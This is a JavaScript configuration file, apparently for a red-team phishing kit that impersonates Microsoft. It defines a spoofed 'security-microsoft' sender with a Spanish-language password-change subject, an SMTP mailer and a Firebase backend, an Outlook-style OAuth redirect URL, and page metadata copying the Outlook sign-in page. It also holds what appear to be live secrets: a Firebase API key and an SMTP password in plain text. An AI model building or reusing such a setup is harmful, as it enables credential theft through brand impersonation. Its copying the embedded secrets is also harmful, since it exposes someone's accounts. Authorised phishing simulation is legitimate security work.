export const firebaseConfig = {
  apiKey: "AIzaSyCVkOZDwhZO_NfKEdW-eqmPnj47ed1Niv8",
  authDomain: "netready-red-team.firebaseapp.com",
  projectId: "netready-red-team",
  storageBucket: "netready-red-team.appspot.com",
  messagingSenderId: "880253036837",
  appId: "1:880253036837:web:22d3651fc8427a4d1a92cc",
  measurementId: "G-5PJ0LDCCP5",
};

export const mailerConfig = {
  template: {
    subject: "Cambio de contraseña de la cuenta Microsoft",
    html: "Hello World!",
    to: "gmaizo@netreadysolutions.com",
    from: "security-microsoft@no-responder.fyi",
  },
  options: {
    host: "smtp.protonmail.ch",
    port: 587,
    secure: false,
    maxConnections: 5,
    maxMessages: 30,
    auth: {
      user: "security-microsoft@no-responder.fyi",
      pass: "3TVPXD1GSUKLC3YC",
    },
  },
};

export const url = {
  base: "/common/oauth2/v2.0/authorize",
  searchParams:
    "?client_id={uuid}&redirect_uri={encodeURIComponent}&response_type=code%20id_token&scope=openid%20profile%20offline_access&response_mode=form_post&nonce=638346296388632495.{token}&x-client-SKU=ID_NET6_0&x-client-ver=6.30.1.0",
  redirect: "https://outlook.office.com/mail/",
  id: "client_id",
};

export const metadata = {
  title: "Iniciar sesión en la cuenta",
  description:
    "Para iniciar sesión en Outlook.com o Hotmail, necesitarás el nombre de usuario y la contraseña de tu cuenta de Microsoft.",
};

export default {
  firebaseConfig,
  mailerConfig,
  metadata,
  url,
};
